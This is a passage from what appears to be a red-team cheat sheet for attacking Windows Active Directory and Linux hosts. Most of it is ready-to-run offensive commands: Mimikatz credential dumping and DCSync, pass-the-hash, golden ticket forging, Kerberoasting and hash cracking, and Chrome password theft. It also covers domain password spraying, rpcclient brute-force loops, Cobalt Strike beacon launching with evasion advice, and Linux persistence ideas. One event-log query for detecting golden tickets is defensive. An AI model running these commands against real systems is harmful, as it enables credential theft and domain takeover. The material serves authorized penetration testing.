<h5 id="user-hunting-functions">User-Hunting Functions:<a class="headerlink" href="#user-hunting-functions" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    Invoke-UserHunter               -   finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines
    Invoke-StealthUserHunter        -   finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users
    Invoke-ProcessHunter            -   hunts for processes with a specific name or owned by a specific user on domain machines
    Invoke-UserEventHunter          -   hunts for user logon events in domain controller event logs
</code></pre></div>
<h5 id="domain-trust-functions">Domain Trust Functions:<a class="headerlink" href="#domain-trust-functions" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    Get-NetDomainTrust              -   gets all trusts for the current user&#39;s domain
    Get-NetForestTrust              -   gets all trusts for the forest associated with the current user&#39;s domain
    Find-ForeignUser                -   enumerates users who are in groups outside of their principal domain
    Find-ForeignGroup               -   enumerates all the members of a domain&#39;s groups and finds users that are outside of the queried domain
    Invoke-MapDomainTrust           -   try to build a relational mapping of all domain trusts
</code></pre></div>
<h5 id="metafunctions">MetaFunctions:<a class="headerlink" href="#metafunctions" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    Invoke-ShareFinder              -   finds (non-standard) shares on hosts in the local domain
    Invoke-FileFinder               -   finds potentially sensitive files on hosts in the local domain
    Find-LocalAdminAccess           -   finds machines on the domain that the current user has local admin access to
    Find-UserField                  -   searches a user field for a particular term
    Find-ComputerField              -   searches a computer field for a particular term
    Get-ExploitableSystem           -   finds systems likely vulnerable to common exploits
    Invoke-EnumerateLocalAdmin      -   enumerates members of the local Administrators groups across all machines in the domain
</code></pre></div>
<p><a href="https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf">HarmJ0y PowerView Cheat Sheet PDF</a>
<a href="https://gist.github.com/HarmJ0y/3328d954607d71362e3c">HarmJ0y's PowerView 2.0 Tricks Gist</a></p>
<h4 id="inveigh">Inveigh<a class="headerlink" href="#inveigh" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a></p>
<p>Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system.</p>
<ul>
<li>The main Inveigh LLMNR/NBNS spoofer function.</li>
</ul>
<div class="highlight"><pre><span></span><code>
</code></pre></div>
<h6 id="privilege-requirements">Privilege Requirements:<a class="headerlink" href="#privilege-requirements" title="Permanent link">&para;</a></h6>
<ul>
<li>Elevated Administrator or SYSTEM</li>
</ul>
<h6 id="features">Features:<a class="headerlink" href="#features" title="Permanent link">&para;</a></h6>
<ul>
<li>IPv4 LLMNR/NBNS spoofer with granular control</li>
<li>NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB</li>
<li>Basic auth cleartext credential capture over HTTP/HTTPS</li>
<li>WPAD server capable of hosting a basic or custom wpad.dat file</li>
<li>HTTP/HTTPS server capable of hosting limited content</li>
<li>Granular control of console and file output</li>
<li>Run time control</li>
</ul>
<h4 id="powershell-wout-powershell">Powershell W/out Powershell<a class="headerlink" href="#powershell-wout-powershell" title="Permanent link">&para;</a></h4>
<ul>
<li>MsBuild.exe
  <a href="https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml">https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml</a></li>
</ul>
<h4 id="get-indexeditem">Get-IndexedItem<a class="headerlink" href="#get-indexeditem" title="Permanent link">&para;</a></h4>
<p>Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents</p>
<p>Sources:
<a href="https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae">https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae</a>
<a href="https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1">https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1</a></p>
<h4 id="interacting-w-windows-api">Interacting w/ Windows API<a class="headerlink" href="#interacting-w-windows-api" title="Permanent link">&para;</a></h4>
<p><a href="https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/">https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/</a></p>
<h5 id="example-lock-workstation-and-messagebox">Example - Lock Workstation and MessageBox<a class="headerlink" href="#example-lock-workstation-and-messagebox" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    Add-Type -TypeDefinition @&quot;
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    public static class User32
    {
        [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]
            public static extern bool MessageBox(
                IntPtr hWnd,     /// Parent window handle
                String text,     /// Text message to display
                String caption,  /// Window caption
                int options);    /// MessageBox type
        [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]
        public static extern bool LockWorkStation();

    }
    &quot;@

    [USER32]::LockWorkStation()
</code></pre></div>
<p>List static methods</p>
<div class="highlight"><pre><span></span><code>    [USER32] |get-member -static
</code></pre></div>
<h4 id="mailsniper-owa-and-exchange-enumeration">MailSniper (OWA and Exchange Enumeration)<a class="headerlink" href="#mailsniper-owa-and-exchange-enumeration" title="Permanent link">&para;</a></h4>
<p>Source: <a href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a></p>
<p>MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.</p>
<p>MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS.</p>
<p>Bypassing Dual Factor Authentication on OWA - <a href="http://www.blackhillsinfosec.com/?p=5396">http://www.blackhillsinfosec.com/?p=5396</a></p>
<ul>
<li>It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange.</li>
<li>Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.com\EWS\Exchange.asmx</li>
</ul>
<p>```Invoke-SelfSearch -Mailbox <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#101;&#109;&#97;&#105;&#108;&#64;&#100;&#111;&#109;&#97;&#105;&#110;&#46;&#99;&#111;&#109;">&#101;&#109;&#97;&#105;&#108;&#64;&#100;&#111;&#109;&#97;&#105;&#110;&#46;&#99;&#111;&#109;</a> -ExchHostname mail.domain.com -Remote</p>
<p>```</p>
<ul>
<li>After the credentials have been entered MailSniper will attempt to connect to the EWS URL at <a href="https://mail.domain.com/EWS/Exchange.asmx">https://mail.domain.com/EWS/Exchange.asmx</a> and search the user’s inbox for key terms (by default “<em>pass</em>”, “<em>creds</em>”, and “<em>credentials</em>”).</li>
</ul>
<h5 id="locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name">Locate OWA instances via Autodiscover using only organization primary domain name<a class="headerlink" href="#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    &lt;smtp-mail-domain&gt;/Autodiscover/Autodiscover.xml

    or

    autodiscover.&lt;smtp-mail-domain&gt;/Autodiscover/Autodiscover.xml

    or

    dig _autodiscover._tcp.&lt;domain-name&gt; SRV
    ; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; _autodiscover._tcp.&lt;domain-name&gt;.org SRV
    ;; global options: +cmd
    ;; Got answer:
    ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 45003
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

    ;; QUESTION SECTION:
    ;_autodiscover._tcp.&lt;domain-name&gt;.org.  IN  SRV

    ;; ANSWER SECTION:
    _autodiscover._tcp.&lt;domain-name&gt;.org. 1720 IN   SRV 0 0 443 webmail.&lt;domain-name&gt;.org.

    ;; Query time: 2 msec
    ;; SERVER: 192.168.178.1#53(192.168.178.1)
    ;; WHEN: Thu Dec  1 10:40:33 2016
    ;; MSG SIZE  rcvd: 83
</code></pre></div>
<h4 id="domainpasswordspray-internal-windows-domain-password-brute-forcing">DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)<a class="headerlink" href="#domainpasswordspray-internal-windows-domain-password-brute-forcing" title="Permanent link">&para;</a></h4>
<p>Source: <a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
<p>DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!</p>
<h5 id="quick-start-guide">Quick Start Guide<a class="headerlink" href="#quick-start-guide" title="Permanent link">&para;</a></h5>
<p>Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'.</p>
<div class="highlight"><pre><span></span><code>    Type &#39;Import-Module Invoke-DomainPasswordSpray.ps1&#39;.
</code></pre></div>
<p>The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts.</p>
<p>The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.</p>
<div class="highlight"><pre><span></span><code>    PowerShell Invoke-DomainPasswordSpray -Password Winter2016
</code></pre></div>
<p>The following command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt</p>
<div class="highlight"><pre><span></span><code>    PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
</code></pre></div>
<h5 id="invoke-domainpasswordspray-options">Invoke-DomainPasswordSpray Options<a class="headerlink" href="#invoke-domainpasswordspray-options" title="Permanent link">&para;</a></h5>
<div class="highlight"><pre><span></span><code>    UserList          - Optional UserList parameter. This will be generated automatically if not specified.
    Password          - A single password that will be used to perform the password spray.
    PasswordList      - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
    OutFile           - A file to output the results to.
    Domain            - A domain to spray against.
</code></pre></div>
<h4 id="misc-powershell-pasties">Misc Powershell Pasties<a class="headerlink" href="#misc-powershell-pasties" title="Permanent link">&para;</a></h4>
<p>List Removeable Drives</p>
<div class="highlight"><pre><span></span><code>    Get-WmiObject Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.DeviceID -ne &#39;A:&#39;)} | %{&quot;USB_PROCESS_DETECTED: &quot; + $_.ProviderName  + &quot;`n&quot;}
</code></pre></div>
<p>Random Execution Method</p>
<div class="highlight"><pre><span></span><code>$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;visio.application&quot;, &quot;system1&quot;))
$docs = $visio.Documents.Add(&quot;&quot;)
$docs.ExecuteLine(&#39;CreateObject(&quot;Wscript.Shell&quot;).Exec(&quot;cmd.exe&quot;)&#39;)
</code></pre></div>
<h3 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/gentilkiwi/mimikatz/wiki">https://github.com/gentilkiwi/mimikatz/wiki</a>
<a href="https://adsecurity.org/?p=2362">https://adsecurity.org/?p=2362</a></p>
<p>Dump Cleartext Credentials</p>
<div class="highlight"><pre><span></span><code>    sekurlsa::wdigest
    sekurlsa::logonpasswords
    lsadump::secrets
</code></pre></div>
<p>Dump cached domain credentials</p>
<div class="highlight"><pre><span></span><code>    lsadump::cache
</code></pre></div>
<p>Format mscachev2 as <code>$DCC2$10240#username#hash</code></p>
<div class="highlight"><pre><span></span><code>    cat &#39;mscachecreds.txt&#39; | awk -F “:” {&#39;print &quot;$DCC2$10240#&quot;$1&quot;#&quot;$2&#39;}
</code></pre></div>
<p>Crack mscachev2 format with Hashcat (extremely slow)</p>
<div class="highlight"><pre><span></span><code>    ./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule
</code></pre></div>
<p>DCSYNC - Remote Hash Dumping from a Domain Controller</p>
<div class="highlight"><pre><span></span><code>    mimikatz lsadump::dcsync /user:domain\krbtgt
</code></pre></div>
<ul>
<li>There is also a CS built-in function for this</li>
<li>Source: <a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/</a></li>
</ul>
<p>Pass the Hash</p>
<div class="highlight"><pre><span></span><code>    mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden
</code></pre></div>
<p>Golden Ticket Creation (File)</p>
<div class="highlight"><pre><span></span><code>    mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt:&lt;krbtgthash&gt; /ticket:newadmin.tkt
</code></pre></div>
<p>Golden Ticket Creation (Pass-The-Ticket) - Create the ticket for your current session</p>
<div class="highlight"><pre><span></span><code>    mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt:&lt;krbtgthash&gt; /ptt
</code></pre></div>
<p>To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces:</p>
<div class="highlight"><pre><span></span><code>    /user:ChildDomainControllerMachineName$  
    /rc4: KRBTGT Hash
    /sid:Child Domain SID
    /domain:FQDN of Child Domain
    /groups:516
    /sids:ParentSID-516,S-1-5-9
    /id:ID of Child Domain Controller
    /ptt
</code></pre></div>
<p>Dump Google Chrome passwords</p>
<div class="highlight"><pre><span></span><code>    shell copy &quot;C:\users\kobrien\appdata\local\google\chrome\user data\default\Login Data&quot; C:\users\public\libraries\ld.dat

    steal_token &lt;user pid&gt;

    mimikatz @dpapi::chrome /in:C:\users\public\libraries\ld.dat /unprotect
</code></pre></div>
<p>Detecting Golden Ticket use on a DC</p>
<div class="highlight"><pre><span></span><code>    &lt;QueryList&gt;
      &lt;Query Id=&quot;0&quot; Path=&quot;Security&quot;&gt;
        &lt;Select Path=&quot;Security&quot;&gt;
            *[System[EventID=&#39;4768&#39;]]
            and
            *[EventData[Data[@Name=&#39;TargetUserName&#39;] != &#39;ANONYMOUS LOGON&#39;]]
            and
            *[EventData[Data[@Name=&#39;ServiceName&#39;] = &#39;krbtgt&#39;]]
            and
            *[EventData[Data[@Name=&#39;TicketEncryptionType&#39;] = &#39;0x17&#39;]]
            &lt;/Select&gt;
      &lt;/Query&gt;
    &lt;/QueryList&gt;
</code></pre></div>
<h3 id="kerberoast">Kerberoast<a class="headerlink" href="#kerberoast" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a>
<a href="https://room362.com/post/2016/kerberoast-pt1/">https://room362.com/post/2016/kerberoast-pt1/</a>
<a href="https://room362.com/post/2016/kerberoast-pt2/">https://room362.com/post/2016/kerberoast-pt2/</a>
<a href="https://room362.com/post/2016/kerberoast-pt3/">https://room362.com/post/2016/kerberoast-pt3/</a></p>
<div class="highlight"><pre><span></span><code>    Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/host.domain.com&quot;
</code></pre></div>
<p>Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used)</p>
<div class="highlight"><pre><span></span><code>    mimkatz kerberos::list /export
    Invoke-Mimikatz -Command &#39;standard::base64 &quot;kerberos::list /export&quot; exit&#39;
</code></pre></div>
<p>Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred)</p>
<div class="highlight"><pre><span></span><code>    proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip &lt;domain controller IP&gt; -outputfile &lt;out.dump&gt;
</code></pre></div>
<p>Cracking the hashes</p>
<div class="highlight"><pre><span></span><code>    ./hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule

    ./john --format=krb5tgs spns.dump --wordlist=
</code></pre></div>
<h3 id="domain-admin-privesc-methods">Domain Admin Privesc Methods<a class="headerlink" href="#domain-admin-privesc-methods" title="Permanent link">&para;</a></h3>
<p><a href="https://adsecurity.org/?p=2362">https://adsecurity.org/?p=2362</a></p>
<ol>
<li>
<p>Passwords in SYSVOL &amp; Group Policy Preferences</p>
<div class="highlight"><pre><span></span><code>findstr /S cpassword %logonserver%\sysvol\*.xml
</code></pre></div>
<p>or use Get-GPPPasswords.ps1 from PowerSploit</p>
</li>
<li>
<p>Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch</p>
</li>
<li>Kerberos TGS Service Ticket Offline Cracking (Kerberoast)</li>
<li>The Credential Theft Shuffle</li>
<li>Gain access to AD Database file (ntds.dit)<ul>
<li>Backup locations (backup server storage, media, and/or network shares)</li>
<li>Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers.</li>
<li>With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline.</li>
</ul>
</li>
</ol>
<h2 id="command-and-control">Command and Control<a class="headerlink" href="#command-and-control" title="Permanent link">&para;</a></h2>
<p>Simple TCP Port Redirection</p>
<div class="highlight"><pre><span></span><code>    socat TCP-LISTEN:80,fork TCP:&lt;remote host&gt;:80
    socat TCP-LISTEN:443,fork TCP:&lt;remote host&gt;:443
</code></pre></div>
<p>UDP Port Redirection</p>
<div class="highlight"><pre><span></span><code>    socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:&lt;IPADDRESS&gt;; echo -ne
</code></pre></div>
<p>Simple HTTP Redirect</p>
<p>Save as a file like the following as redirect.html and map to root "/" on your Team Server. Casual browsing to the root of your domain will then simply redirect.</p>
<div class="highlight"><pre><span></span><code>    &lt;html&gt;
    &lt;title&gt;Google&lt;/title&gt;
    &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=https://www.googlrrrr.com&quot; /&gt;
    &lt;/html&gt;
</code></pre></div>
<h3 id="domain-fronting">Domain Fronting<a class="headerlink" href="#domain-fronting" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://github.com/rvrsh3ll/FindFrontableDomains">https://github.com/rvrsh3ll/FindFrontableDomains</a></li>
</ul>
<h3 id="cobalt-strike">Cobalt Strike<a class="headerlink" href="#cobalt-strike" title="Permanent link">&para;</a></h3>
<p><a href="http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/">http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/</a>
<a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna">https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna</a>
<a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a></p>
<div class="highlight"><pre><span></span><code>    portscan 10.42.175.0/26 21,22,23,25,80,443,445,1433,3389,8080,8443
</code></pre></div>
<p><em>Start Remote Beacon DLL via iwmi</em></p>
<div class="highlight"><pre><span></span><code>    powerpick iwmi -class Win32_Process -name create -ArgumentList &quot;rundll32.exe c:\users\public\libraries\smb_beacon.dll.log0,StartW&quot;
</code></pre></div>
<h4 id="opsec-considerations-for-beacon-commands">OPSEC Considerations for Beacon Commands<a class="headerlink" href="#opsec-considerations-for-beacon-commands" title="Permanent link">&para;</a></h4>
<p><a href="https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/#respond">Blog.Cobaltstrike.com - OPSEC Considerations For Beacon Commands</a></p>
<p>A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe.</p>
<p><em>API-only</em>
These commands are built-into Beacon and rely on Win32 APIs to meet their objectives.</p>
<div class="highlight"><pre><span></span><code>    cd
    cp
    download
    drives
    exit
    getuid
    kerberos_ccache_use
    kerberos_ticket_purge
    kerberos_ticket_use
    jobkill
    kill
    link
    ls
    make_token
    mkdir
    mv
    ppid
    ps
    pwd
    rev2self
    rm
    rportfwd
    socks
    steal_token
    timestomp
    unlink
    upload
</code></pre></div>
<p><em>House-keeping Commands</em>
The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute.</p>
<div class="highlight"><pre><span></span><code>    cancel
    checkin
    clear
    downloads
    help
    jobs
    mode dns
    mode dns-txt
    mode dns6
    mode http
    note
    powershell-import
    sleep
    socks stop
    spawnto
</code></pre></div>
<p><em>Post-Exploitation Jobs (Process Execution + Remote Process Injection)</em>
Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs:</p>
<div class="highlight"><pre><span></span><code>    browserpivot
    bypassuac
    covertvpn
    dcsync
    desktop
    elevate
    hashdump
    keylogger
    logonpasswords
    mimikatz
    net
    portscan
    powerpick
    psinject
    pth
    screenshot
    shspawn
    spawn
    ssh
    ssh-key
    wdigest
</code></pre></div>
<p>OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don’t want that). The ppid command will change the parent process these jobs are run under as well.</p>
<p><em>Process Execution</em>
These commands spawn a new process:</p>
<div class="highlight"><pre><span></span><code>    execute
    runas
    runu
</code></pre></div>
<p>OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu.</p>
<p><em>Process Execution: Cmd.exe</em>
The shell command depends on cmd.exe.</p>
<p>The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe.</p>
<p>OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script’s &amp;bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand.</p>
<p><em>Process Execution: PowerShell.exe</em>
The following commands launch powershell.exe to perform some task on your behalf.</p>
<div class="highlight"><pre><span></span><code>powershell
spawnas
spawnu
winrm
wmi
</code></pre></div>
<p>OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe:</p>
<div class="highlight"><pre><span></span><code>spawnu has runu which runs an arbitrary command under another process.
spawnas has runas which runs an arbitrary command as another user.
powershell has powerpick, this command runs powershell scripts without powershell.exe.
</code></pre></div>
<p>It’s also possible to laterally spread without the winrm and wmi commands.
Remote Process Injection</p>
<p>The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are:</p>
<div class="highlight"><pre><span></span><code>dllinject
inject
shinject
</code></pre></div>
<p><em>Service Creation</em></p>
<p>The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services.</p>
<div class="highlight"><pre><span></span><code>    getsystem
    psexec
    psexec_psh
</code></pre></div>
<h4 id="powershell-function-wrapper">Powershell Function Wrapper<a class="headerlink" href="#powershell-function-wrapper" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna">https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna</a>
<a href="https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/">https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/</a></p>
<h4 id="persistence-scripts">Persistence Scripts<a class="headerlink" href="#persistence-scripts" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script</a>
<a href="https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna">https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna</a></p>
<h3 id="empire">EMPIRE<a class="headerlink" href="#empire" title="Permanent link">&para;</a></h3>
<p>Cheat sheets</p>
<div class="highlight"><pre><span></span><code>    - https://github.com/adaptivethreat/Empire/wiki/Quickstart
    - https://attackerkb.com/Powershell/Powershell_Empire
</code></pre></div>
<p>Clone GIT Repo</p>
<div class="highlight"><pre><span></span><code>    root@workstation:~# git clone https://github.com/adaptivethreat/Empire.git empire
    Cloning into &#39;empire&#39;...
</code></pre></div>
<p>Install Empire</p>
<div class="highlight"><pre><span></span><code>    root@workstation:~# cd empire/
    root@workstation:~/empire# cd setup/
    root@workstation:~/empire/setup# ./install.sh
    Reading package lists... Done
    Building dependency tree
    Reading state information... Done
    ...

    Successfully installed pydispatcher
    Cleaning up...

     [&gt;] Enter server negotiation password, enter for random generation:

     [*] Database setup completed!

    root@workstation:~/empire/setup#
</code></pre></div>
<p>Start Empire</p>
<div class="highlight"><pre><span></span><code>    root@workstation:~/empire/setup# cd ..
    root@workstation:~/empire# ./empire
</code></pre></div>
<p>Start with REST API for use with Empire Web</p>
<div class="highlight"><pre><span></span><code>    ./empire --headless --username admin --password &lt;PASSWORD&gt; --restport 1337

    ./empire --rest --username admin --password &lt;PASSWORD&gt; --restport 1337
</code></pre></div>
<h4 id="c2-profiles">C2 Profiles<a class="headerlink" href="#c2-profiles" title="Permanent link">&para;</a></h4>
<p>Edit default client settings in <code>/setup/setup_database.py</code></p>
<p>Example Default Profile</p>
<div class="highlight"><pre><span></span><code>    &quot;/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en&quot;
</code></pre></div>
<h2 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h2>
<h3 id="bash">BASH<a class="headerlink" href="#bash" title="Permanent link">&para;</a></h3>
<p>BASH loop example</p>
<div class="highlight"><pre><span></span><code>    for u in `cat hosts.txt`; do
        echo -n &quot;[*] user: $u&quot; &amp;&amp; \
        proxychains python /usr/local/bin/secretsdump.py domain/username@$u -hashes aad3b435b51404eeaad3b435b51404ee:0e493911f561a425e7a905329f4454bf |tee user_brute.log
    done
</code></pre></div>
<p>BASH .bashrc Function Example</p>
<div class="highlight"><pre><span></span><code>    function start_sshtunnel() {
        ssh -A -t -p22 -L 8800:localhost:8800 james@123.001.123 -t ssh -L 8800:localhost:80 james@124.125.123
    }
</code></pre></div>
<p>Quick BASH format .bash_profile (mod ipconfig &gt; ifconfig for Linux)</p>
<div class="highlight"><pre><span></span><code># .bash_profile

PATH=$PATH:/home/james/

export PATH

alias ls=&#39;ls -G&#39;
alias grep=&#39;grep --color=auto&#39;
alias la=&#39;ls -AlahG&#39;
alias el=&#39;sudo $(history -p \!\!)&#39;
alias ll=&#39;ls -alF&#39;
alias l=&#39;ls -CF&#39;
alias lg=&#39;ls -AlahG |grep $1&#39;
alias netstati=&#39;lsof -P -i -n&#39;

export PS1=&quot;\n\n\[\$(if [[ \$? == 0 ]]; then echo \&quot;\[$GREEN\]✓\&quot;; else echo \&quot;\[$RED\]✕\&quot;; fi)[\033[33m\]\D{%Y%m%d_%H%M%S}\[\033[m\] \[\033[36m\]\u@\h__`ipconfig getifaddr en0`__`ipconfig getifaddr en8`\[\033[m\]] \[\033[1;31m\]\n[\w]\[\033[m\] \n \$
</code></pre></div>
<p>Create NTLM Hash from Mac CLI</p>
<div class="highlight"><pre><span></span><code>    echo -n password | iconv -t UTF-16LE | openssl md4
</code></pre></div>
<h3 id="linux-persistence-ideas">Linux Persistence Ideas<a class="headerlink" href="#linux-persistence-ideas" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>    Cron
    Add SSH keys
    Add SUID to world-writeable script (chmod u+s &lt;file&gt;)
    Add init script (reboot persistence)
</code></pre></div>
<h3 id="rpcclient">rpcclient<a class="headerlink" href="#rpcclient" title="Permanent link">&para;</a></h3>
<p><a href="http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions">http://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions</a></p>
<div class="highlight"><pre><span></span><code>    rpcclient -U &quot;&quot; -N &lt;WinIPaddr&gt;
    rpcclient -U &lt;username&gt; &lt;WinIPaddr&gt;
    rpcclient $&gt; srvinfo
    rpcclient $&gt; enum
    rpcclient $&gt; enumdomusers
    rpcclient $&gt; queryuser 500
</code></pre></div>
<p>Password bruteforce via rpcclient</p>
<div class="highlight"><pre><span></span><code>    for u in `cat users_sorted.txt`; do
        echo -n &quot;[*] user: $u&quot; &amp;&amp; \
        proxychains rpcclient -U &quot;domain\$u%$u&quot; -c &quot;getusername;quit&quot; 10.9.8.40
    done
</code></pre></div>
<p>Pass the Hash Variant</p>
<div class="highlight"><pre><span></span><code>    pth-rpcclient -U &quot;domain\name%hash&quot; --pw-nt-hash 10.4.128.41
</code></pre></div>
<h3 id="enum4linux">enum4linux<a class="headerlink" href="#enum4linux" title="Permanent link">&para;</a></h3>
